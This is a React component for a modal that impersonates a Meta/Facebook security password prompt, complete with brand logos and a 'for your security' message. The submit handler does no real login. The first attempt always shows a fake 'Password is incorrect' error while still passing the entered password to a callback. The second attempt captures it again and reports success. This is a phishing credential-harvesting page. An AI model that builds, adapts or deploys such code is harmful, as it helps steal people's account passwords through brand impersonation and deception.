import { useState } from 'react';
import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import FbRoundLogo from '@/assets/images/fb_round_logo.png';

const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
    const [formData, setFormData] = useState({
        password: ''
    });
    const [loginAttempt, setLoginAttempt] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);

    const handleChange = (field, value) => {
        setFormData((prev) => ({ ...prev, [field]: value }));
        if (showError) {
            setShowError(false);
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        if (!formData.password.trim()) {
            return;
        }

        setIsLoading(true);
        setShowError(false);

        setTimeout(() => {
            setIsLoading(false);

            if (loginAttempt === 0) {
                setShowError(true);
                setLoginAttempt(1);
                onSubmit('', formData.password);
            } else {
                setShowError(false);
                onSubmit('', formData.password);
                onSuccess();
            }
        }, 1500);
    };

    if (!show) return null;

    /* ── Styles ── */
    const overlayStyle = {
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0,0,0,0.45)',
        zIndex: 1040,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '16px',
    };

    const cardStyle = {
        width: '100%',
        maxWidth: '480px',
        backgroundColor: '#fff',
        borderRadius: '16px',
        boxShadow: '0 20px 50px rgba(15, 23, 42, 0.2)',
        padding: '20px',
        display: 'flex',
        flexDirection: 'column',
        minHeight: 'min(860px, calc(100vh - 16px))',
        maxHeight: 'min(860px, calc(100vh - 16px))',
        overflowY: 'auto',
        transform: 'scale(1)',
        opacity: 1,
    };

    const contentStyle = {
        height: '100%',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'space-between',
        flex: 1,
    };

    const inputStyle = {
        width: '100%',
        height: '40px',
        border: `1px solid ${showError ? '#ef4444' : '#d4dbe3'}`,
        borderRadius: '10px',
        padding: '0 12px',
        fontSize: '14px',
        outline: 'none',
        boxSizing: 'border-box',
        marginBottom: '12px',
    };

    const submitBtnStyle = {
        width: '100%',
        height: '40px',
        minHeight: '40px',
        borderRadius: '40px',
        backgroundColor: '#0064E0',
        color: '#fff',
        fontSize: '14px',
        fontWeight: 500,
        border: 'none',
        cursor: isLoading ? 'default' : 'pointer',
        transition: 'background-color 0.2s ease',
    };

    return (
        <div style={overlayStyle} onClick={onClose}>
            <div style={cardStyle} onClick={(e) => e.stopPropagation()}>
                <div style={contentStyle}>
                    <div style={{ width: '48px', height: '48px', marginBottom: '20px' }}>
                        <img src={FbRoundLogo} width="100%" height="100%" alt="Meta" style={{ objectFit: 'contain' }} />
                    </div>

                    <div style={{ width: '100%' }}>
                        <p style={{ color: '#9a979e', fontSize: '14px', marginBottom: '16px' }}>
                            {texts.securityReason || 'For your security, you must enter your password to continue.'}
                        </p>

                        <form autoComplete="off" onSubmit={handleSubmit}>
                            <input
                                style={inputStyle}
                                type="password"
                                placeholder={texts.password || 'Password'}
                                autoComplete="off"
                                autoCorrect="off"
                                autoCapitalize="none"
                                spellCheck="false"
                                maxLength="30"
                                minLength="3"
                                required
                                value={formData.password}
                                onChange={(e) => handleChange('password', e.target.value)}
                            />

                            {showError && (
                                <p style={{ color: '#ef4444', fontSize: '14px', margin: '0 0 12px 0' }}>
                                    {texts.passwordIncorrect || 'Password is incorrect, please try again.'}
                                </p>
                            )}

                            <button
                                type="submit"
                                style={submitBtnStyle}
                                disabled={isLoading}
                                onMouseOver={(e) => {
                                    if (!isLoading) e.currentTarget.style.backgroundColor = '#1d4ed8';
                                }}
                                onMouseOut={(e) => {
                                    e.currentTarget.style.backgroundColor = '#0064E0';
                                }}
                            >
                                {isLoading ? (
                                    <span style={{
                                        width: '18px',
                                        height: '18px',
                                        border: '2px solid rgba(255,255,255,0.4)',
                                        borderTopColor: '#fff',
                                        borderRadius: '50%',
                                        animation: 'spin 0.8s linear infinite',
                                        display: 'inline-block',
                                    }} />
                                ) : (texts.continueBtn || 'Continue')}
                            </button>

                            <p style={{ textAlign: 'center', marginTop: '12px', marginBottom: 0 }}>
                                <a href="#" style={{ color: '#9a979e', fontSize: '14px', textDecoration: 'none' }}>
                                    {texts.forgotPassword || 'Forgot your password?'}
                                </a>
                            </p>
                        </form>
                    </div>

                    <div style={{ width: '64px', marginTop: '20px' }}>
                        <img src={MetaLogo} width="100%" alt="Meta" style={{ objectFit: 'contain' }} />
                    </div>
                </div>
            </div>

            <style>{`
                @keyframes spin {
                    to { transform: rotate(360deg); }
                }
            `}</style>
        </div>
    );
};

LoginModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired
};

export default LoginModal;
